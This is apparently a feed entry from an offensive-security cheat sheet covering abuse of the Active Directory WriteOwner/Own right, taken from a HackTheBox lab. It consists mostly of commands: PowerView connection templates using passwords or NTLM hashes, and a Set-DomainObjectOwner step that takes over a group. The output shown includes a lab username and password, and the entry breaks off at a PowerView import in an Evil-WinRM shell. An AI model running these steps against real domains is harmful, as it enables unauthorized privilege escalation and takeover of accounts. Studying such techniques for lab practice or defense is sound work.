channel.title: Own on TLDRBins

item.title: WriteOwner/Own
item.description: Abuse #1 : Change Owner of the Group/User Linux Windows 1. Powerview.py # Password powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' $ powerview 'CERTIFIED.HTB/judith.mader:judith09@DC01.CERTIFIED.HTB' ╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:<auto>] ╰─PV ❯ # NTLM powerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -H '<HASH>' 2. Change Owner Set-DomainObjectOwner -TargetIdentity '<TARGET_IDENTITY>' -PrincipalIdentity '<TARGET_USER>' ╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:<auto>] ╰─PV ❯ Set-DomainObjectOwner -TargetIdentity 'Management' -PrincipalIdentity 'judith.mader' [2025-07-17 03:16:36] [Set-DomainObjectOwner] Changing current owner S-1-5-21-729746778-2675978091-3820388244-512 to S-1-5-21-729746778-2675978091-3820388244-1103 [2025-07-17 03:16:36] [Set-DomainObjectOwner] Success! modified owner for CN=Management,CN=Users,DC=certified,DC=htb 1. Import PowerView . .\PowerView.ps1 *Evil-WinRM* PS C:\Users\maria> . .
